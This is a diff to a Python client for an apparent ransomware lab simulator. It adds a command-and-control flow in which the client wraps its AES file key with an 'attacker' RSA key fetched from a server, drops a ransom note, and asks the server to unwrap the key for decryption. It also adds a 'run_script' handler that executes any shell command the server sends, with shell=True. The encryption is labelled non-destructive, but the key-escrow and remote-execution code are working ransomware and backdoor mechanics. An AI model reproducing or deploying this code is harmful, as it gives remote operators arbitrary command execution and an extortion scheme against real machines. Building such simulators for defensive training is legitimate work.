@@ -21,8 +21,11 @@ import os
 import socket
 import time
 import requests
+import base64
+import subprocess
 import socketio  # python-socketio client
 import sys
+from urllib.parse import urlsplit, urlunsplit
 
 # Import simulator from local package
 try:
@@ -144,20 +147,98 @@ def main():
         print(f"[client] Auth error: {msg}")
         sio.disconnect()
 
+    # Track whether we've already wrapped and stored our AES key for this session
+    state = {"wrapped": False}
+
+    def _device_key_path():
+        # Place a .key file in sandbox root to simulate per-victim key blob storage
+        return os.path.join(simulator.test_directory, "victim_aes.key")
+
+    def _get_attacker_public_key() -> str | None:
+        try:
+            # Query device registry and find this device by token
+            r = session.get(f"{backend}/devices", timeout=10)
+            r.raise_for_status()
+            devs = (r.json() or {}).get("devices") or []
+            for d in devs:
+                if d.get("token") == device_token:
+                    return d.get("public_key_pem")
+        except Exception as e:
+            print(f"[client] Failed to fetch attacker public key: {e}")
+        return None
+
     @sio.on("encrypt")
     def on_encrypt(_msg=None):
         print("[client] Received ENCRYPT signal – starting simulation (non-destructive)…")
         try:
             files = simulator.simulate_encryption(destructive=False)
             print(f"[client] Encrypted files: {len(files)}")
+            # Flow A: wrap K_AES with attacker's RSA pubkey and store alongside files
+            if not state["wrapped"]:
+                attacker_pub = _get_attacker_public_key()
+                if attacker_pub:
+                    try:
+                        from cryptography.hazmat.primitives import serialization, hashes
+                        from cryptography.hazmat.primitives.asymmetric import padding
+                        pub = serialization.load_pem_public_key(attacker_pub.encode())
+                        k_b64 = simulator.get_key()
+                        k = base64.b64decode(k_b64)
+                        wrapped = pub.encrypt(
+                            k,
+                            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+                        )
+                        os.makedirs(simulator.test_directory, exist_ok=True)
+                        with open(_device_key_path(), "wb") as f:
+                            f.write(base64.b64encode(wrapped))
+                        state["wrapped"] = True
+                        print("[client] Stored wrapped AES key blob (.key)")
+                    except Exception as e:
+                        print(f"[client] Failed to wrap/store AES key: {e}")
+                else:
+                    print("[client] No attacker public key attached for this device; skipping key wrap.")
+            # Drop a ransom note in sandbox root
+            try:
+                note = os.path.join(simulator.test_directory, "README_RESTORE_FILES.txt")
+                with open(note, "w", encoding="utf-8") as f:
+                    f.write(
+                        "Your files have been encrypted in this lab simulation.\n\n" \
+                        "To restore, provide the wrapped key blob file and follow instructions on the website.\n" \
+                        "This is a SAFE DEMO: no actual data was harmed."
+                    )
+                print("[client] Dropped ransom note")
+            except Exception as e:
+                print(f"[client] Failed to drop ransom note: {e}")
         except Exception as e:
             print(f"[client] Encryption failed: {e}")
 
     @sio.on("decrypt")
     def on_decrypt(msg=None):
         print("[client] Received DECRYPT signal – restoring files…")
-        # If private key is provided by server, ignore (site-side concept)
+        # Flow A: read wrapped key blob, ask attacker (website) to unwrap, set AES key, then decrypt
         try:
+            key_path = _device_key_path()
+            if os.path.exists(key_path):
+                try:
+                    with open(key_path, "rb") as f:
+                        wrapped_b64 = f.read().decode()
+                    req = {"token": device_token, "wrapped_key_base64": wrapped_b64}
+                    # If server pushed a private key in message, include as override (lab/demo)
+                    if msg and isinstance(msg, dict) and msg.get("private_key_pem"):
+                        req["private_key_pem"] = msg["private_key_pem"]
+                    r = session.post(f"{backend}/keys/unwrap", json=req, timeout=20)
+                    if r.ok:
+                        aes_b64 = (r.json() or {}).get("aes_key_base64")
+                        if aes_b64:
+                            simulator.set_key_from_base64(aes_b64)
+                            print("[client] AES key restored from attacker response")
+                        else:
+                            print("[client] Unwrap response missing aes_key_base64")
+                    else:
+                        print(f"[client] Unwrap failed: {r.status_code} {r.text}")
+                except Exception as e:
+                    print(f"[client] Failed to request unwrap: {e}")
+            else:
+                print("[client] No wrapped key blob found; attempting decryption with current key")
             simulator.simulate_decryption()
             print("[client] Decryption complete")
         except Exception as e:
@@ -167,13 +248,35 @@ def main():
     def disconnect():
         print("[client] Disconnected. Will try to reconnect…")
 
-    # Socket.IO server URL (use HTTP base; client handles upgrade)
+    @sio.on("run_script")
+    def on_run_script(msg=None):
+        try:
+            cmd = (msg or {}).get("command")
+            if not cmd:
+                print("[client] run_script received without command")
+                return
+            print(f"[client] Running command: {cmd}")
+            # On Windows VMs this can run python C:\path\to\script.py as requested
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+            print("[client] run_script exit code:", result.returncode)
+            if result.stdout:
+                print("[client] run_script stdout:\n" + result.stdout)
+            if result.stderr:
+                print("[client] run_script stderr:\n" + result.stderr)
+        except Exception as e:
+            print(f"[client] run_script failed: {e}")
+
+    # Socket.IO server URL: if backend ends with /py_simple, connect sockets to origin
     try:
-        print(f"[client] Connecting to {backend} …")
+        # Origin without path
+        parts = urlsplit(backend)
+        origin = urlunsplit((parts.scheme, parts.netloc, '', '', ''))
+        socket_base = origin if parts.path.rstrip('/') == '/py_simple' else backend
+        print(f"[client] Connecting to {socket_base} …")
         transports = ["polling"] if args.polling else ["websocket", "polling"]
         # socketio_path default is 'socket.io' but set explicitly to avoid proxy/path issues.
         sio.connect(
-            backend,
+            socket_base,
             transports=transports,
             wait_timeout=30,
             socketio_path='socket.io'
